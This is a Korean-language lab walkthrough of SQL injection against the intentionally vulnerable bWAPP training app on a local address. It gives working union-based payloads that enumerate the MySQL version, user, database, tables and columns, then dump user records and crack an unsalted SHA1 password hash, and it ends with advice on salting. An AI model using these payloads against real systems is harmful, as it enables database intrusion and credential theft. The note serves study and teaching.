## SQL - GET(search)

Get이라고하는 것은 주소창에 내용이 그대로 보인다. 

action=search → search를 의미한다. 

```c
http://192.168.56.101/bWAPP/sqli_1.php?title=man&action=search
```

[POST -search]

해당 정보들이 주소창에 보이지 않고 변수가 보이지 않는 방법이다. 

그래서 GET이 더 공격하기 쉽다. 

```c
http://192.168.56.101/bWAPP/sqli_6.php
```

### [1. SQL 인젝션 가능 여부 체크]

1) 검색에 ‘ 만 입력하기 (싱글 따옴표)

다음과 같은 SQL 오류(구문 오류) 발생 ⇒ 이것은 sql injection이 가능한 환경이라는 것을 의미 

여기서 %27는 ‘를 의미

[`http://192.168.56.101/bWAPP/sqli_1.php?title=%27&action=search`](http://192.168.56.101/bWAPP/sqli_1.php?title=%27&action=search)

```c
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

`SELECT * FROM ___ WHERE TITLE=’ ____(검색 내용)___’`

이런 식으로 사용자 입력(검색 내용)을 받아서 DB에서 처리를 해줄 것이다. 

그렇다면 싱글 따옴표를 입력했을 때 다음과 같은 쿼리문이 나올 것이다. 

`SELECT * FROM ___ WHERE TITLE=’%27’`

항상의심을 해야 한다. 사용자의 입력에 문제가 있을 수 있다는 것을 고려해야 한다. 

### [2. SQL 인젝션을 통해 테이블 정보 확인 ]

[http://192.168.56.101/bWAPP/sqli_1.php?title='+or+1%3D1%23&action=search](http://192.168.56.101/bWAPP/sqli_1.php?title=%27+or+1%3D1%23&action=search)

SELECT * FROM ___ WHERE TITLE=’ ***‘ or 1=1#*** ’

**‘ or 1=1#**을 입력하게 되면 처음 ‘은 ‘’로 인식하게 되므로 false가 되고 or 다음에 1=1는 true이므로 통과가 된다. 그리고 #는 주석 처리이므로 마지막에 있는 ‘를 없애주는 역할을 한다. 

결과 = 모든 데이터베이스의 정보들을 확인 가능

### [3. 기존 SQL 명령어 컬럼 수 추정]

‘ union select all 1#

union = 새로운 쿼리문을 주겠다. 

몇개의 컬럼이 있는지 모르므로 모든 것을 가져오되, (select all) 

→ 그 중 하나의 컬럼을 가져오겠다 1

하지만 오류가 나왔다. 

```c
The used SELECT statements have a different number of columns
```

원인 = 원래의 데이터베이스에 있는 컬럼의 수는 적어도 5개 이상일 텐데 우리는 그 전체 데이터 베이스와 컬럼 1개를 합치라고 명령했기 때문에 갯수가 맞지 않아서 오류 메시지를 얻음 

즉, 컬럼 수가 틀렸다는 것을 말한 것임 

일단 1이라고 했는데 오류 메시지가 나왔기 때문에 일단 1개의 칼럼만 가지고 있는 것은 아니라는 것을 알 수 있음

### [4. 테이블 컬럼 수 확인을 위해 사용]

' union select all 1, 2#

' union select all 1, 2, 3#

…

' union select all 1, 2, 3,4 ,5, 6, 7# → 성공 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a7b3b480-fdf7-4a32-a910-934088808f86/Untitled.png)

밑에 있는 2, 3, 5, 4는 해당 컬럼에서 가져왔다는 것을 의미하며 1, 4, 6, 7칼럼은 가져오지 못했다는 것을 의미한다. 

### [MySQL의 버전 정보를 알 수 있다. ]

@@version 이라는 명령어 사용 (mysql 의 버전 정보를 가져오는 명령어 )

`' union select all 1, @@version, 3, 4, 5, 6, 7#`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41dcac01-ffa9-4694-b812-ee5e5a4b24a0/Untitled.png)

2칼럼의 버전 정보를 가져올 수 있다. → 시스템 내부에서 어떤 버전의 명령어를 써야하는지 알 수 있음 

### [현재 사용자 아이디 확인 ]

`' union select all 1, user(), 3, 4, 5, 6, 7#`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e207210e-c93f-4789-8b6e-b30fff0c3790/Untitled.png)

### [데이터 베이스 명 확인]

database()

`' union select all 1, user(), 3, 4, database(), 6, 7#`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8eadeabc-ad5a-4175-97df-4cf90be6c49c/Untitled.png)

bWAPP이라는 것을 알 수 있었음 

### [테이블 명]

데이터베이스 내에서 사용하는 전체 테이블 출력 

`' union select all 1, table_name, 3, 4, 5, 6, 7 from information_schema.tables#`

mysql 에서 전체적으로 관리하고 있는 테이블들에는 어떤 것들이 있는지에 대한 정보들 표현

테이블 내용 출력 

결과 = users 테이블 → 유저 정보들이 있을 것으로 예상

### [users 테이블에 있는 모든 컬럼들을 가져오기]

`' union select all 1, column_name, 3, 4, 5, 6, 7 from information_schema.columns where table_name='users'#`

결과 = id, password, login, email 등이 있다. 

### [users 테이블 중 일부 정보 가져오기]

`' union select all 1,id,login, email, password, 6, 7 from users#`

id = A.I.M. , bee

login = 6885858486f31043e5839c735d99457f045affd0, 6885858486f31043e5839c735d99457f045affd0

[https://crackstation.net/](https://crackstation.net/)(rainbow table로 해시값 도출)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c55f853-5abf-4e17-bea2-4e5f36e54152/Untitled.png)

타입이 sha1이라는 것을 알 수 있다. 

단순 해쉬값으로 저장했다. (salt값을 넣어서 해쉬를 해야 하는데 그냥 했기 때문에 바로 정보를 알 수 있다. ) 

각 유저들 마다 다른 salt값을 넣어야 더 안전하다 (ex) 0000 + pw

같은 salt값을 넣으면 해시값이면 같은 값이라는 것을 알 수 있으므로 보다 좀 더 쉽게 유추할 수 있다.  

그래서 0000+id+pw 이런 식으로 다르게 salt값을 적용해야 할 것이다.
